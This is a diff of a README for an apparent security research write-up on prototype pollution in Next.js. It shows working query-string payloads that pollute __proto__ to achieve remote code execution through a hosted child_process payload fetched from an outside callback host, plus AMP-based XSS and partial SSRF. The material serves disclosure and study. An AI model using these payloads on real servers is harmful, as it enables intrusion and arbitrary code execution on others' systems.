@@ -6,10 +6,15 @@ A prototype pollution scenario in [Next.js](https://github.com/vercel/next.js/) 
 
 ## Setup Instructions
 
-Install dependencies and start production server.
+Install dependencies and start server.
 
 ```sh
 npm install
+
+# Run as Dev
+npm run dev
+
+# Run as Prod
 npm run build
 npm start
 ```
@@ -63,7 +68,7 @@ Remote code execution in `Validator` (uses `vm` module) via `validator`
 3. Request to vulnerable page with `validator` should trigger the RCE.
 
    ```sh
-   /vulnerable?__proto__.validator=https://xss-callback.pwnfunction.repl.co/
+   /vulnerable?__proto__.validator=https://rce-callback.pwnfunction.repl.co/
    # Hosted payload: (this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')
    ```
 
@@ -142,6 +147,19 @@ Also a partial SSRF via `node-fetch` during AMP transform.
 
 **Poc**
 
+```js
+// next.config.js
+module.exports = {
+  reactStrictMode: true,
+  experimental: {
+    amp: {
+      optimizer: {},
+      // skipValidation: true, /* required on dev-server */
+    },
+  },
+};
+```
+
 1. Request to any AMP enabled page.
 
    ```sh
@@ -163,13 +181,8 @@ Also a partial SSRF via `node-fetch` during AMP transform.
    ```
 
 ```sh
-# On production
-/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.ampSkipValidation=1&__proto__.ampUrlPrefix=https://xss-callback.pwnfunction.repl.co
-```
-
-```sh
-# Partial SSRF - works if route `/*` does not return 404 else server hangs
-/vulnerable?__proto__.ampUrlPrefix=https://URL/
+# Partial SSRF - works if SSRF target route `/*` does not return 404 else server hangs
+/vulnerable?__proto__.ampUrlPrefix=https://TARGET.URL/
 
 ```
 
@@ -227,24 +240,6 @@ async transformHtml(t, e) {
 ```
 
 > ➕ Also while initializing runtime styles in `@ampproject/toolbox-optimizer`, response body from `ampUrlPrefix` is inserted directly into the ssr-page, meaning one can still achieve XSS even if `RewriteAmpUrls` transformer is disabled.
-
-> 📝 Note (On Dev Server): In `next.config.js`, we skip validation `skipValidation: true`.
-> This is to disable `SeparateKeyframes` (`fn 1053`) - eventually throws `filter on undefined` due to prototype pollution. (Lazy fix)
-
-```js
-// next.config.js
-module.exports = {
-  reactStrictMode: true,
-  experimental: {
-    amp: {
-      optimizer: {},
-      skipValidation: true,
-    },
-  },
-};
-```
-
-✅ On Production server, it doesn't matter because we are skipping validation via `__proto__.ampSkipValidation=1`.
 
 ## Redirect SSR
 
